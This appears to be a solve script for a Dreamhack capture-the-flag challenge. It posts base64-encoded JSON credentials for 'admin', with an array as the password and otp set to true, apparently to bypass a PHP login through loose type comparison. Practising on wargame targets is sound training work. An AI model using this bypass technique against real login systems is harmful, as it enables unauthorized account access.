import requests
import base64
import json
from bs4 import BeautifulSoup

# 대상 URL
url = "http://host3.dreamhack.games:22881/index.php"

    # JSON 데이터 생성
data = {
        "id": "admin",
        "pw": [1,2,3],
        "otp": True
    }

    # Base64로 인코딩
encoded_data = base64.b64encode(json.dumps(data).encode('utf-8')).decode('utf-8')
    
    # POST 요청 보냄
response = requests.post(url, data={"cred": encoded_data})
print(response.text)